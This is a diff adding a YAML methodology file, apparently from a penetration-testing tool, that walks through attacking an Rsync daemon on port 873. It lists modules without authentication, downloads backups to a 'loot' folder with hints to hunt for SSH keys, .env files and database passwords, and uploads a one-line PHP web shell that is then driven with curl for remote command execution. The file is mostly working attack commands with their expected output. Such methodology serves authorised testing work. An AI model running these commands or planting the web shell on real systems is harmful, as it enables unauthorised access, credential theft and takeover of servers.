@@ -1,0 +1,58 @@
+id: rsync
+name: Rsync Remote Synchronization (Port 873)
+category: network
+description: Methodology for Rsync daemon on port 873. Covers unauthenticated module enumeration, recursive file downloads, and web shell uploads.
+port_triggers:
+  - 873
+service_triggers:
+  - rsync
+tags:
+  - rsync
+  - file-transfer
+  - recon
+  - upload
+steps:
+  - id: rsync-list-modules
+    title: Enumerate Accessible Rsync Modules
+    phase: reconnaissance
+    purpose: Connect to the Rsync daemon to list all exported shared modules and directory paths without authentication.
+    command: rsync -av --list-only rsync://{{TARGET}}/
+    expected_output:
+      - backups        Daily system backups
+      - www            Web application root
+    common_mistakes:
+      - If standard CLI hangs, test with `nc -nv {{TARGET}} 873` to verify protocol greeting.
+    if_success: Accessible modules found! Proceed to download files or upload web shells.
+    if_failure: Authentication required. Test with candidate credentials.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
+  - id: rsync-download-module
+    title: Download Remote Rsync Module Files
+    phase: enumeration
+    purpose: Download all files and subdirectories from an open Rsync module to your local attacking machine.
+    command: rsync -av rsync://{{TARGET}}/{{MODULE_NAME|backups}} ./rsync_loot/
+    expected_output:
+      - receiving incremental file list
+      - backup.tar.gz
+      - id_rsa
+      - sent 120 bytes  received 1.45M bytes
+    common_mistakes:
+      - Inspect downloaded archives for `.env`, `id_rsa`, and database passwords.
+    if_success: Files downloaded! Inspect contents for credentials.
+    if_failure: Read access denied. Test write access.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
+  - id: rsync-upload-webshell
+    title: Upload Web Shell via Writable Rsync Module
+    phase: exploitation
+    purpose: If the `www` or `html` module has write permissions, upload a PHP web shell to obtain remote code execution.
+    command: echo '<?php system($_GET["cmd"]); ?>' > shell.php && rsync -av shell.php rsync://{{TARGET}}/{{MODULE_NAME|www}}/shell.php
+    expected_output:
+      - shell.php
+      - sent 180 bytes  received 35 bytes
+    common_mistakes:
+      - Verify which web port (80/443/8080) maps to the uploaded web directory.
+    if_success: Web shell uploaded! Execute commands via `curl "{{TARGET_URL}}/shell.php?cmd=whoami"`.
+    if_failure: Permission denied (read-only module).
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync
